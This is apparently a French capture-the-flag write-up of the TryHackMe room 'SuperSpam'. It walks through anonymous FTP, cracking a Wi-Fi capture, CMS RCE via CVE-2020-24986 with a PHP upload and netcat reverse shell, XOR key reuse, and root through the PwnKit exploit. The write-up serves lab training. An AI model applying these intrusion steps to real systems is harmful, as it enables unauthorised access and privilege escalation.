# SuperSpamOld
URL : https://tryhackme.com/room/superspamr

La room du jour, a base d'aliens pro windows ! 

# Enum
## Nmap
```
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-11 09:24 EDT
Nmap scan report for 10.10.137.113
Host is up (0.032s latency).
Not shown: 65530 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Home :: Super-Spam
|_http-server-header: Apache/2.4.29 (Ubuntu)
4012/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 86:60:04:c0:a5:36:46:67:f5:c7:24:0f:df:d0:03:14 (RSA)
|   256 ce:d2:f6:ab:69:7f:aa:31:f5:49:70:e5:8f:62:b0:b7 (ECDSA)
|_  256 73:a0:a1:97:c4:33:fb:f4:4a:5c:77:f6:ac:95:76:ac (ED25519)
4019/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x    2 ftp      ftp          4096 Feb 20  2021 IDS_logs
|_-rw-r--r--    1 ftp      ftp           526 Feb 20  2021 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.14.59.209
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
5901/tcp open  vnc     VNC (protocol 3.8)
| vnc-info: 
|   Protocol version: 3.8
|   Security types: 
|     VNC Authentication (2)
|     Tight (16)
|   Tight auth subtypes: 
|_    STDV VNCAUTH_ (2)
6001/tcp open  X11     (access denied)
Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 63.26 seconds

```
# FTP Port: 4019
```
┌──(kali㉿kali)-[~/Challenge/TryHackMe/SuperSpamold]
└─$ ftp 10.10.137.113 4019  
Connected to 10.10.137.113.
220 (vsFTPd 3.0.3)
Name (10.10.137.113:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||47192|)
150 Here comes the directory listing.
drwxr-xr-x    4 ftp      ftp          4096 May 30  2021 .
drwxr-xr-x    4 ftp      ftp          4096 May 30  2021 ..
drwxr-xr-x    2 ftp      ftp          4096 May 30  2021 .cap
drwxr-xr-x    2 ftp      ftp          4096 Feb 20  2021 IDS_logs
-rw-r--r--    1 ftp      ftp           526 Feb 20  2021 note.txt
```
Je récupère le fichier note.txt, il y a aussi dans le dossier IDS_logs pas mal de fichier mais en grande partie vide, je prend les fichiers pcap qui ne sont pas vide.
Dans le dossier .cap, il y a 2 fichiers que je récupère aussi :
```
ftp> cd .cap
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||44312|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 May 30  2021 .
drwxr-xr-x    4 ftp      ftp          4096 May 30  2021 ..
-rw-r--r--    1 ftp      ftp           249 Feb 20  2021 .quicknote.txt
-rwxr--r--    1 ftp      ftp        370488 Feb 20  2021 SamsNetwork.cap

```
## .PCAP / .PCAPNG
Plusieurs fichiers, qui corresponde a peu prêt avec les dates des commentaires sur le fichier note.txt.
```
12th January: Note to self. Our IDS seems to be experiencing high volumes of unusual activity.
We need to contact our security consultants as soon as possible. I fear something bad is going
to happen. -adam

13th January: We've included the wireshark files to log all of the unusual activity. It keeps
occuring during midnight. I am not sure why.. This is very odd... -adam

15th January: I could swear I created a new blog just yesterday. For some reason it is gone... -adam

24th January: Of course it is... - super-spam :)
```
Ainsi que le fichier .quicknotes:
```
┌──(kali㉿kali)-[~/Challenge/TryHackMe/SuperSpam]
└─$ cat .quicknote.txt 
It worked... My evil plan is going smoothly.
 I will place this .cap file here as a souvenir to remind me of how I got in...
 Soon! Very soon!
 My Evil plan of a linux-free galaxy will be complete.
 Long live Windows, the superior operating system!
```
On va regarder ce fichier .cap !

Voici les informations trouvés dans ces fichiers .pcap

### SamsNetwork.cap
Il s'agit d'une connexion wifi. On peux le crack le password avec aircrack-ng
```
aircrack-ng SamsNetwork.cap -w rockyou.txt
```
Il trouve un mot de passe :
```
                        Aircrack-ng 1.7 

      [00:00:31] 872373/14344392 keys tested (28421.53 k/s) 

      Time left: 7 minutes, 54 seconds                           6.08%

                           KEY FOUND! [ s******o ]


      Master Key     : 93 5E 0C 77 A3 B7 17 62 0D 1E 31 22 51 C0 42 92 
                       6E CF 91 EE 54 6B E1 E3 A8 6F 81 FF AA B6 64 E1 

      Transient Key  : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 

      EAPOL HMAC     : 1E FB DC A0 1D 48 49 61 3B 9A D7 61 66 71 89 B0 
```

### 12-01-21.req.pcapng
On y trouve une enumeration des users du groupe admin:
```
Administrator
a-jbrown
a-arobinson
vray
```
### 13-01-21.pcap
On y trouve une connexion vers http[:]//id1[.]cn/rd[.]s/Btc5n4unOP4UrIfE?url=http[:]//id1[.]cn/
C'est un site en chine.

### 14-01-21.pcapng
Ici, on y vois une connexion sur un partage SMB avec ces informations:
```
Username : lgreen
Hostname : 02694W-WIN10
DNS : 01566s-win16-ir.threebeesco.com
Path : \\172.16.66.36\IPC$
Pre-auth hash: 17fa89923fc1fbcd941b488d0e83e82a6d8c1b4a6ddfe34fd083d45ac40a156f93b4e4fc6025e1c207d60b2f905648ff92c436e7c4062d172fa83ff9ab668743
```
### 16-01-21.pcap
Enormement de packet TCP bloquer mais c'est aussi une visite sur le même site chinois.

Il y a aussi ce lien : http[:]//batit[.]aliyun[.]com/alww[.]html

# Le CMS !
Sur le blog, j'avais trouver 2 potentiels users en regardant le blog :
```
Benjamin_Blogger 
Lucy_Loser
Donald_Dump
Adam_admin
```
Le compte de Donald fonctionne avec le mot de passe. On a accès au CMS!
```
Donald_Dump:s******o
```

Il s'agit du CMS Concrete5-8.5.2, nous avons de la chance, il existe la CVE-2020-24986 permetant une RCE. Plus d'info [ici](https://hackerone.com/reports/768322)

# RCE
On va modifier les extensions autorisée sur le CMS pour y ajouter .php.
Nous allons ensuite upload un shell php.

```
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.11.50.195] from (UNKNOWN) [10.10.129.168] 53288
Linux super-spam 4.15.0-140-generic #144-Ubuntu SMP Fri Mar 19 14:12:35 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 09:18:07 up 28 min,  1 user,  load average: 0.00, 0.00, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
root     pts/0    :1               08:50   27:25   0.00s  0.00s sh
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```
Nous avons l'accès au serveur.

# Privesc !
Le flag user ce trouve dans **/home/personal/Work/flag.txt**

Il y a un ficheir **nextEvilPlan.txt**
```
My next evil plan is to ensure that all linux filesystems are disorganised so that these 
linux users will never find what they are looking for (whatever that is)... That should
stop them from gaining back control!
```
Dans un dossier cacher **.MessagesBackupToGalactic** sur **/home/lucy_lower** on y trouve tout ca ! :
```
-rw-r--r-- 1 kali kali 171897 Apr  8  2021 c10.png
-rw-r--r-- 1 kali kali 172320 Apr  8  2021 c1.png
-rw-r--r-- 1 kali kali 168665 Apr  8  2021 c2.png
-rw-r--r-- 1 kali kali 171897 Apr  8  2021 c3.png
-rw-r--r-- 1 kali kali 171462 Apr  8  2021 c4.png
-rw-r--r-- 1 kali kali 167772 Apr  8  2021 c5.png
-rw-r--r-- 1 kali kali 167772 Apr  8  2021 c6.png
-rw-r--r-- 1 kali kali 171462 Apr  8  2021 c7.png
-rw-r--r-- 1 kali kali 171734 Apr  8  2021 c8.png
-rw-r--r-- 1 kali kali 173994 Apr  8  2021 c9.png
-rw-r--r-- 1 kali kali  20987 Apr  8  2021 d.png
-rw-r--r-- 1 kali kali    497 May 30  2021 note.txt
-rw-r--r-- 1 kali kali   1199 Oct 13 05:24 xored.py
```
note.txt :
```
Note to self. General super spam mentioned that I should not make the same mistake again of re-using the same key for the XOR encryption of our messages to Alpha Solaris IV's headquarters, otherwise we could have some serious issues if our encrypted messages are compromised. I must keep reminding myself,do not re-use keys,I have done it 8 times already!.The most important messages we sent to the HQ were the first and eighth message.I hope they arrived safely.They are crucial to our end goal.
```
Mot de passe visible trouvé avec les images xor : 
```
$**************l
```

Après plusieurs tests, il s'agit du mdp de donalddump
# Privesc to root 
Comme on peux le lire dans le fichier **nextEvilPlan.txt**, le linux est complétement désorganiser. 

On va devoir chercher comment il fonctionne.

J'importe LSE et l'execute, il me trouve une vulnerabilité:
```
[!] cve-2021-4034 Checking for PwnKit vulnerability........................ yes!
---
Vulnerable! polkit version: 0.105-20ubuntu0.18.04.5
```
Je récupère donc PwnKit [ici](https://github.com/ly4k/PwnKit) puis je l'envoi sur le serveur et lance l'exploit
```
donalddump@super-spam:/tmp$ chmod +x PwnKit 
donalddump@super-spam:/tmp$ ./PwnKit 
root@super-spam:/tmp#
```
Me voila root !

Je vais dans le dossier **/root** 
```
drwx------  8 root root 20480 Oct 13 08:50 .
drwxr-xr-x 22 root root  4096 Apr  9  2021 ..
-rw-------  1 root root   642 Oct 13 08:50 .Xauthority
lrwxrwxrwx  1 root root     9 Apr  9  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root  3106 Apr  9  2018 .bashrc
drwx------  2 root root  4096 Feb 19  2021 .cache
drwx------  3 root root  4096 Feb 19  2021 .gnupg
drwxr-xr-x  3 root root  4096 Feb 19  2021 .local
-rw-------  1 root root   969 May 29  2021 .mysql_history
drwxr-xr-x  2 root root  4096 Feb 24  2021 .nothing
-rw-r--r--  1 root root   148 Aug 17  2015 .profile
-rw-r--r--  1 root root    66 Apr  8  2021 .selected_editor
drwx------  2 root root  4096 Feb 19  2021 .ssh
-rw-------  1 root root     0 May 29  2021 .viminfo
drwx------  2 root root  4096 Oct 13 08:50 .vnc
-rw-r--r--  1 root root   208 Apr  9  2021 .wget-hsts
-rw-------  1 root root  1368 Apr  8  2021 .xsession-errors
```
On y vois un dossier **.nothing** suspicieux.

Le flag est bien dedans:
```
drwxr-xr-x 2 root root  4096 Feb 24  2021 .
drwx------ 8 root root 20480 Oct 13 08:50 ..
-rw-r--r-- 1 root root   377 Feb 20  2021 r00t.txt
```
```
──(kali㉿kali)-[~/Challenge/TryHackMe/SuperSpam]
└─$ cat r00t.txt       

what am i?: MZWG********************4WTMTS7PU======

KRUGS4ZANFZSA3TPOQQG65TFOIQSAWLPOUQG2YLZEBUGC5TFEBZWC5TFMQQHS33VOIQGEZLMN53GKZBAOBWGC3TFOQQHI2DJOMQHI2LNMUWCASDBMNVWK4RNNVQW4LBAMJ2XIICJEB3WS3DMEBRGKIDCMFRWWIDXNF2GQIDBEBRGSZ3HMVZCYIDNN5ZGKIDEMFZXIYLSMRWHSIDQNRQW4IDUN4QGOZLUEBZGSZBAN5TCA5DIMF2CA2LOMZSXE2LPOIQG64DFOJQXI2LOM4QHG6LTORSW2LBAJRUW45LYFYQA====
```
Après un passage dans cyberchef, c'est du base32
```
what am i?: flag{it********************N_}

This is not over! You may have saved your beloved planet this time, Hacker-man, but I will be ba...
```
# La curiosité vous savez... 
Comme je suis curieux, je vais voir dans **/home/donalddump/** et j'y trouve alors plusieurs choses :
```
drwxr-xr-x 2 root       root       4096 Feb 24  2021 morning
drwxr-xr-x 2 root       root       4096 Feb 24  2021 notes
-rw-r--r-- 1 root       root          8 Apr  8  2021 passwd
```
Les 2 dossiers sont vides, mais le fichier passwd non.

Je le récupère et on va voir ce qu'on en fait

Après recherche, il s'agit d'un fichier password pour vnc !
```
vncviewer -passwd passwd 10.10.129.168::5901
```
Cela nous donne la main sur le serveur en root. Mais bon, on étais déjà root avec PwnKit :)
